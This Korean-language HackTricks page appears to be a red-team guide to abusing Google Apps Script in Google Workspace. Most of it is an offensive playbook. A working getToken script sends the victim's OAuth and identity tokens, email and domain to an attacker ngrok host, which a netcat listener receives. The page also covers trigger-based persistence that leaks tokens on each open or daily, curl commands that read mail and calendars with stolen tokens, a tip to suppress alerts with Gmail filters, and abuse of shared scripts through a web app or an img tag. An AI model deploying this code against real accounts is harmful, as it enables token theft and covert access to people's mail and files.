# GWS - 앱 스크립트

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 앱 스크립트

앱 스크립트는 **편집자 권한을 가진 사용자가 연결된 앱 스크립트와 연결된 문서에 액세스하고 OAuth 프롬프트를 수락한 후에 트리거되는 코드**입니다.\
또한 앱 스크립트의 소유자가 설정하여 **일정한 시간마다 실행**되도록 할 수도 있습니다 (지속성).

### 앱 스크립트 생성

앱 스크립트를 생성하는 여러 가지 방법이 있지만, 가장 일반적인 방법은 **Google 문서 (모든 유형)**와 **독립 프로젝트**에서 생성하는 것입니다:

<details>

<summary>Google 문서, 시트 또는 슬라이드에서 바운드 프로젝트 생성</summary>

1. 문서, 시트 또는 슬라이드를 엽니다.
2. **확장 기능** > **Google Apps Script**를 클릭합니다.
3. 스크립트 편집기에서 **Untitled project**를 클릭합니다.
4. 프로젝트에 이름을 지정하고 **Rename**을 클릭합니다.

</details>

<details>

<summary>독립 프로젝트 생성</summary>

Apps Script에서 독립 프로젝트를 생성하려면:

1. [`script.google.com`](https://script.google.com/)으로 이동합니다.
2. **새 프로젝트 추가**를 클릭합니다.
3. 스크립트 편집기에서 **Untitled project**를 클릭합니다.
4. 프로젝트에 이름을 지정하고 **Rename**을 클릭합니다.

</details>

<details>

<summary>Google Drive에서 독립 프로젝트 생성</summary>

1. [Google Drive](https://drive.google.com/)를 엽니다.
2. **새로 만들기** > **더보기** > **Google Apps Script**를 클릭합니다.

</details>

<details>

<summary>Google Forms에서 바운드 프로젝트 생성</summary>

1. Google Forms에서 양식을 엽니다.
2. 더보기 more\_vert > **스크립트 편집기**를 클릭합니다.
3. 스크립트 편집기에서 **Untitled project**를 클릭합니다.
4. 프로젝트에 이름을 지정하고 **Rename**을 클릭합니다.

</details>

<details>

<summary>clasp 명령 줄 도구를 사용하여 독립 프로젝트 생성</summary>

`clasp`는 터미널에서 Apps Script 프로젝트를 생성, 가져오기/배포할 수 있는 명령 줄 도구입니다.

자세한 내용은 [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp)를 참조하세요.

</details>

## 앱 스크립트 시나리오 <a href="#create-using-clasp" id="create-using-clasp"></a>

### 앱 스크립트로 Google 시트 생성

앱 스크립트를 생성하기 위해 먼저 앱 스크립트를 생성하세요. 이 시나리오에서는 Google 시트를 생성하고 **`Extensions > App Scripts`**로 이동하세요. 이렇게 하면 시트에 연결된 **새로운 앱 스크립트가 열립니다**.

### 토큰 노출

OAuth 토큰에 액세스하려면 **`Services +`를 클릭하여 스코프를 추가**해야 합니다:

* **AdminDirectory**: 디렉터리의 사용자 및 그룹에 액세스합니다 (사용자에게 충분한 권한이 있는 경우)
* **Gmail**: Gmail 데이터에 액세스합니다.
* **Drive**: 드라이브 데이터에 액세스합니다.
* **Google Sheets API**: 트리거와 함께 작동하도록 설정합니다.

**필요한 스코프**를 직접 변경하려면 프로젝트 설정으로 이동하여 **`Show "appsscript.json" manifest file in editor`를 활성화**하세요.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

요청을 캡처하기 위해 다음을 실행할 수 있습니다:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
App 스크립트를 실행하기 위해 요청된 권한:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
외부 요청이 발생하면 OAuth 프롬프트에서도 **외부 엔드포인트에 액세스할 권한을 요청**합니다.
{% endhint %}

### 트리거 생성

App을 읽은 후 **⏰ 트리거**를 클릭하여 트리거를 생성합니다. **함수**로 **`getToken`**을 선택하고, 배포 시 **`Head`**에서 실행되도록 선택하고, 이벤트 소스에서 **`스프레드시트에서`** 선택하고, 이벤트 유형에서 **`열기 시`** 또는 **`편집 시`** (필요에 따라) 선택하고 저장합니다.

참고로, 디버그를 위해 **App 스크립트의 실행 내역을 실행 탭에서 확인**할 수 있습니다.

### 공유

**App 스크립트**를 **트리거**하기 위해서는 피해자가 **편집자 액세스**로 연결해야 합니다.

요약하면, 생성자와 초대된 사용자가 **동일한 조직**에서 온 경우, **OAuth 토큰**은 파일에 액세스하는 **사용자**에게 **속할 것**입니다.\
그들이 **다른 조직**에서 온 경우, **토큰**은 항상 **트리거의 생성자**에게 속하게 되며, 트리거가 생성될 때 **OAuth 권한만 부여**됩니다.

{% hint style="success" %}
**App 스크립트를 실행하는 데 사용되는 토큰**은 파일이 다른 사용자에 의해 편집자로 열려 있더라도 **트리거의 생성자의 토큰**이 될 것입니다.
{% endhint %}

### 공유된 문서 남용

{% hint style="danger" %}
누군가가 **App 스크립트와 트리거를 사용하여 Head**를 사용하여 문서를 공유했다면 (고정 배포가 아닌 경우), App 스크립트 코드를 수정하고 액세스할 수 있으며, **App 스크립트는 문서를 공유한 사용자의 권한으로 실행**됩니다! (트리거가 생성될 때 제공된 액세스 범위가 소유자의 OAuth 토큰에 있을 것입니다).

**스크립트를 수정한 사실을 스크립트의 생성자에게 알리는 알림**이 전송됩니다 (알림을 방지하기 위해 gmail 권한을 사용하여 필터를 생성하는 것은 어떨까요?)
{% endhint %}

{% hint style="success" %}
**공격자가 App 스크립트의 범위를 수정**하면 업데이트가 문서에 **적용되지 않습니다**. 따라서, 공격자는 생성한 트리거에서 설정한 범위보다 더 많은 범위를 가진 소유자 생성 토큰을 도용할 수 없습니다.
{% endhint %}

### 공유 대신 복사

문서를 공유하기 위해 링크를 생성하면 다음과 유사한 링크가 생성됩니다: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
링크의 끝 부분인 **"/edit"**를 **"/copy"**로 변경하면, 구글에서 문서의 **사본을 생성할지 묻는 메시지가 표시**됩니다:

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

사용자가 사본을 생성하고 액세스하면 **문서의 내용과 App 스크립트가 복사**되지만, **트리거는 복사되지 않으므로** 아무것도 실행되지 않습니다.

### 웹 애플리케이션으로 공유

App 스크립트를 **웹 애플리케이션으로 공유**할 수도 있습니다 (App 스크립트의 편집기에서 웹 애플리케이션으로 배포), 하지만 다음과 같은 경고가 표시됩니다:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

필요한 권한을 요청하는 **일반적인 OAuth 프롬프트**가 이어집니다.

### 테스트

수집한 토큰을 사용하여 이메일 목록을 나열하는 테스트를 수행할 수 있습니다:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

사용자의 캘린더 목록:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script로 지속성 확보

지속성을 위한 하나의 옵션은 **문서를 생성하고 getToken 함수에 대한 트리거를 추가하고 공격자와 문서를 공유하여 공격자가 파일을 열 때마다 피해자의 토큰을 유출시키는 것**입니다.

또한 App Script를 생성하고 X 시간마다(분, 시간, 일 등) 트리거를 설정할 수도 있습니다. **자격증명이나 피해자의 세션을 침해한 공격자는 App Script 시간 트리거를 설정하고 매일 매우 권한이 있는 OAuth 토큰을 유출시킬 수 있습니다**:

App Script를 생성하고 트리거로 이동하여 트리거 추가를 클릭하고 이벤트 소스로 Time-driven을 선택하고 원하는 옵션을 선택하십시오:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
이렇게 하면 보안 경고 이메일과 모바일에 푸시 메시지가 생성되어 알림이 전송됩니다.
{% endhint %}



### 공유 문서 미검증 프롬프트 우회

또한, 누군가가 **편집 권한을 가진 문서를 공유**했다면, **문서 내에서 App Script를 생성**하고 **문서의 소유자(생성자)가 App Script의 소유자가 될 것**입니다.

{% hint style="warning" %}
즉, **문서의 생성자는 편집 권한을 가진 사람이 문서 내에서 생성한 모든 App Script의 생성자로 표시**됩니다.

이는 또한 **App Script가 문서의 생성자의 Workspace 환경에서 신뢰받을 것**을 의미합니다.
{% endhint %}

{% hint style="danger" %}
이는 또한, **App Script가 이미 존재**하고 사람들이 **액세스 권한을 부여**한 경우, 편집자 권한을 가진 사람은 **App Script를 수정하고 해당 액세스를 악용**할 수 있습니다.\
이를 악용하기 위해서는 사람들이 App Script를 트리거할 수 있어야 합니다. 그리고 스크립트를 웹 앱으로 **게시하는 것도 한 가지 꿀팁**입니다. App Script에 이미 **액세스 권한을 부여한 사람들**이 웹 페이지에 액세스하면, 그들은 **App Script를 트리거**할 수 있습니다(`<img>` 태그를 사용하여도 작동합니다).
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 PDF로 HackTricks를 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **당신의 해킹 기교를 공유**하세요.

</details>
